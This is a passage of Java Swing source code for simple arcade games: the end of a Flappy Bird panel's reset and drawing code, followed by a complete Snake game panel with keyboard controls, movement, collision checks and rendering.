            pipeY = (int) (Math.random() * (HEIGHT - PIPE_GAP - 100)) + 50;
            score = 0;
            gameOver = false;
            started = true;
        }
        
        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            
            // Draw bird
            g.setColor(Color.YELLOW);
            g.fillRect(50, birdY, 30, 30);
            
            // Draw pipes
            g.setColor(Color.GREEN);
            g.fillRect(pipeX, 0, PIPE_WIDTH, pipeY);
            g.fillRect(pipeX, pipeY + PIPE_GAP, PIPE_WIDTH, HEIGHT - pipeY - PIPE_GAP);
            
            // Draw score
            g.setColor(Color.BLACK);
            g.setFont(new Font("Arial", Font.BOLD, 24));
            g.drawString("Score: " + score, 20, 30);
            
            // Draw game over or start message
            if (gameOver) {
                g.setFont(new Font("Arial", Font.BOLD, 36));
                g.drawString("Game Over!", WIDTH / 2 - 100, HEIGHT / 2);
                g.setFont(new Font("Arial", Font.PLAIN, 18));
                g.drawString("Press SPACE to restart", WIDTH / 2 - 90, HEIGHT / 2 + 40);
            } else if (!started) {
                g.setFont(new Font("Arial", Font.BOLD, 36));
                g.drawString("Flappy Bird", WIDTH / 2 - 100, HEIGHT / 2 - 50);
                g.setFont(new Font("Arial", Font.PLAIN, 18));
                g.drawString("Press SPACE to start", WIDTH / 2 - 90, HEIGHT / 2 + 20);
            }
        }
    }
    
    // Snake Game
    static class SnakeGame extends JPanel {
        private static final int WIDTH = 400;
        private static final int HEIGHT = 600;
        private static final int GRID_SIZE = 20;
        private static final int GRID_WIDTH = WIDTH / GRID_SIZE;
        private static final int GRID_HEIGHT = HEIGHT / GRID_SIZE;
        private static final int GAME_SPEED = 500; // milliseconds
        
        private ArrayList<Point> snake;
        private Point apple;
        private Direction direction;
        private boolean gameOver;
        private boolean started;
        private int score;
        
        private enum Direction {
            UP, DOWN, LEFT, RIGHT
        }
        
        public SnakeGame() {
            setPreferredSize(new Dimension(WIDTH, HEIGHT));
            setBackground(Color.BLACK);
            setFocusable(true);
            
            resetGame();
            
            addKeyListener(new KeyAdapter() {
                @Override
                public void keyPressed(KeyEvent e) {
                    if (!started) {
                        started = true;
                        return;
                    }
                    
                    if (gameOver) {
                        if (e.getKeyCode() == KeyEvent.VK_SPACE) {
                            resetGame();
                        }
                        return;
                    }
                    
                    switch (e.getKeyCode()) {
                        case KeyEvent.VK_UP:
                            if (direction != Direction.DOWN) {
                                direction = Direction.UP;
                            }
                            break;
                        case KeyEvent.VK_DOWN:
                            if (direction != Direction.UP) {
                                direction = Direction.DOWN;
                            }
                            break;
                        case KeyEvent.VK_LEFT:
                            if (direction != Direction.RIGHT) {
                                direction = Direction.LEFT;
                            }
                            break;
                        case KeyEvent.VK_RIGHT:
                            if (direction != Direction.LEFT) {
                                direction = Direction.RIGHT;
                            }
                            break;
                    }
                }
            });
            
            Timer timer = new Timer(GAME_SPEED, e -> {
                if (started && !gameOver) {
                    moveSnake();
                    checkCollisions();
                }
                repaint();
            });
            timer.start();
        }
        
        private void resetGame() {
            snake = new ArrayList<>();
            snake.add(new Point(GRID_WIDTH / 2, GRID_HEIGHT / 2));
            direction = Direction.RIGHT;
            gameOver = false;
            started = false;
            score = 0;
            placeApple();
        }
        
        private void moveSnake() {
            Point head = snake.get(0);
            Point newHead = new Point(head);
            
            switch (direction) {
                case UP:
                    newHead.y--;
                    break;
                case DOWN:
                    newHead.y++;
                    break;
                case LEFT:
                    newHead.x--;
                    break;
                case RIGHT:
                    newHead.x++;
                    break;
            }
            
            snake.add(0, newHead);
            
            // Check if snake ate apple
            if (newHead.equals(apple)) {
                score++;
                placeApple();
            } else {
                snake.remove(snake.size() - 1);
            }
        }
        
        private void checkCollisions() {
            Point head = snake.get(0);
            
            // Check wall collision
            if (head.x < 0 || head.x >= GRID_WIDTH || head.y < 0 || head.y >= GRID_HEIGHT) {
                gameOver = true;
                return;
            }
            
            // Check self collision
            for (int i = 1; i < snake.size(); i++) {
                if (head.equals(snake.get(i))) {
                    gameOver = true;
                    return;
                }
            }
        }
        
        private void placeApple() {
            Random random = new Random();
            int x, y;
            
            do {
                x = random.nextInt(GRID_WIDTH);
                y = random.nextInt(GRID_HEIGHT);
            } while (snake.contains(new Point(x, y)));
            
            apple = new Point(x, y);
        }
        
        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            
            // Draw snake
            g.setColor(Color.GREEN);
            for (Point segment : snake) {
                g.fillRect(segment.x * GRID_SIZE, segment.y * GRID_SIZE, GRID_SIZE, GRID_SIZE);
            }
            
            // Draw apple
            g.setColor(Color.RED);
            g.fillRect(apple.x * GRID_SIZE, apple.y * GRID_SIZE, GRID_SIZE, GRID_SIZE);
            
            // Draw score
            g.setColor(Color.WHITE);
            g.setFont(new Font("Arial", Font.BOLD, 20));
            g.drawString("Score: " + score, 10, 25);
            
            // Draw game over or start message
            if (gameOver) {
                g.setFont(new Font("Arial", Font.BOLD, 36));
                g.drawString("Game Over!", WIDTH / 2 - 100, HEIGHT / 2);
                g.setFont(new Font("Arial", Font.PLAIN, 18));
                g.drawString("Press SPACE to restart", WIDTH / 2 - 90, HEIGHT / 2 + 40);
            } else if (!started) {
                g.setFont(new Font("Arial", Font.BOLD, 36));
                g.drawString("Snake Game", WIDTH / 2 - 100, HEIGHT / 2 - 50);
                g.setFont(new Font("Arial", Font.PLAIN, 18));
                g.drawString("Use arrow keys to move", WIDTH / 2 - 100, HEIGHT / 2);
                g.drawString("Press any key to start", WIDTH / 2 - 95, HEIGHT / 2 + 30);
            }
        }
    }
}
